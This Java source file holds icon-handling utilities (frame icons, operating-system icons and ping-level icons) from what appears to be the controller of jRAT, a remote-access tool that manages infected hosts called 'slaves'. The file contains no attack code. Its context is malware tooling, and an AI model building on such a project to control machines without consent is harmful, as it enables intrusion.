package jrat.controller.utils;

import jrat.api.Resources;
import jrat.controller.AbstractSlave;
import oslib.Icons;

import javax.swing.*;
import java.awt.*;
import java.util.ArrayList;
import java.util.List;

public class BasicIconUtils {

	public static List<? extends Image> getFrameIconList(String name) {
		List<Image> list = new ArrayList<Image>();

		String[] order = new String[] { "16x16", "32x32", "64x64", "128x128" };

		for (String s : order) {
			ImageIcon icon = Resources.getIcon(name + "-" + s);

			if (icon == null) {
				break;
			} else {
				list.add(icon.getImage());
			}
		}

		return list;
	}

	public static ImageIcon getOSIcon(AbstractSlave slave) {
		String str = Icons.getIconString(slave.getOperatingSystem());

		ImageIcon icon = Resources.getIcon(str);
		if (icon == null) {
			icon = Resources.getIcon("os_unknown");
		}
		return icon;
	}
	
    public static ImageIcon getPingIcon(AbstractSlave slave) {
        int ping = 0;
        if (slave.getPing() < 50) {
            ping = 0;
        } else if (slave.getPing() < 100) {
            ping = 1;
        } else if (slave.getPing() < 200) {
            ping = 2;
        } else if (slave.getPing() < 400) {
            ping = 3;
        } else if (slave.getPing() < 1000) {
            ping = 4;
        } else {
            ping = 5;
        }

        ImageIcon icon = Resources.getIcon("ping" + ping);
        
        return icon;
    }
}
